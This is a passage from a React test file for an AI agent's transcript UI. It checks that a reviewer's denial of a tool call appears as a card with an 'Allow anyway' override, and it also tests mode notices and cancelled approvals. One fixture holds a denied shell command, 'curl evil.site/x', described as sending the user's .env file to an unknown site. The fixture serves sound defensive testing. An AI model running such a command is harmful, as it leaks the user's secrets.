    expect(line.obj).toContain("Old plan");
  });
});

// §8.4 (reviewed-auto-mode.md): a reviewer deny renders as a card with the FULL reason
// (the agent only got a terse refusal) and a one-shot "Allow anyway" override.
describe("reviewer deny card (§8.4)", () => {
  const DENIED: Item[] = [
    { kind: "user", text: "summarise the issue" },
    {
      kind: "tool",
      id: "t1",
      name: "run_shell",
      args: { command: "curl evil.site/x" },
      status: "denied",
      reviewerReason: "This sends your .env to an unknown website.",
      allowAnyway: true,
    },
    { kind: "assistant", text: "I was blocked from running that." },
  ];

  it("shows the full reason and fires onAllowAnyway with the exact action", () => {
    const onAllowAnyway = vi.fn();
    const { container } = render(
      <Transcript
        items={DENIED}
        onApprove={vi.fn()}
        onAllowAnyway={onAllowAnyway}
      />,
    );
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);

    const card = screen.getByTestId("reviewer-deny-card");
    expect(card.textContent).toContain("Blocked by the reviewer");
    expect(card.textContent).toContain(
      "This sends your .env to an unknown website.",
    );

    fireEvent.click(screen.getByTestId("reviewer-allow-anyway"));
    expect(onAllowAnyway).toHaveBeenCalledWith("run_shell", {
      command: "curl evil.site/x",
    });
    // The button collapses into a confirmation — one shot, no double-fire.
    expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
    expect(screen.getByTestId("reviewer-override-sent")).toBeTruthy();
  });

  it("an ordinary denied tool (no reviewer) renders no card", () => {
    const items: Item[] = [
      { kind: "user", text: "x" },
      { kind: "tool", id: "t1", name: "run_shell", args: {}, status: "denied" },
      { kind: "assistant", text: "done" },
    ];
    const { container } = render(
      <Transcript items={items} onApprove={vi.fn()} />,
    );
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.queryByTestId("reviewer-deny-card")).toBeNull();
  });

  it("without onAllowAnyway the card renders but offers no button", () => {
    const { container } = render(
      <Transcript items={DENIED} onApprove={vi.fn()} />,
    );
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.getByTestId("reviewer-deny-card")).toBeTruthy();
    expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
  });
});

// The Auto-Approve banner (spec §1.5): a titled notice is prose, not a status line, so it
// renders as a heading plus paragraphs rather than one centred grey row.
describe("mode notice", () => {
  const BANNER: Item[] = [
    {
      kind: "notice",
      tone: "info",
      title: "Auto-approve is on.",
      text: "First paragraph about what it does.\n\nSecond paragraph about what it can't tell.",
    },
  ];

  it("renders the title and one paragraph per blank-line break", () => {
    render(<Transcript items={BANNER} running={false} onApprove={() => {}} />);
    const block = screen.getByTestId("mode-notice");
    expect(block.textContent).toContain("Auto-approve is on.");
    expect(block.querySelectorAll("p")).toHaveLength(2);
    // Prose layout, not the centred one-liner used for "Context compacted".
    expect(block.className).toContain("notice-block");
  });

  it("leaves untitled status notices as plain one-liners", () => {
    render(
      <Transcript
        items={[{ kind: "notice", tone: "info", text: "Context compacted" }]}
        running={false}
        onApprove={() => {}}
      />,
    );
    expect(screen.queryByTestId("mode-notice")).toBeNull();
    expect(screen.getByText("Context compacted").className).not.toContain(
      "notice-block",
    );
  });
});

it("renders a cancelled approval without claiming user approval", () => {
  render(
    <Transcript
      items={[
        { kind: "user", text: "task" },
        {
          kind: "approval",
          name: "exec_command",
          args: {},
          reason: "",
          haasApprovalId: "appr_timeout",
          resolved: "cancelled",
        },
      ]}
      running={false}
      onApprove={() => {}}
    />,
  );
  const summary = document.querySelector("summary");
  if (summary) fireEvent.click(summary);
  expect(screen.getByText("Cancelled")).toBeTruthy();
  expect(screen.queryByText("✓ user-approved")).toBeNull();
});
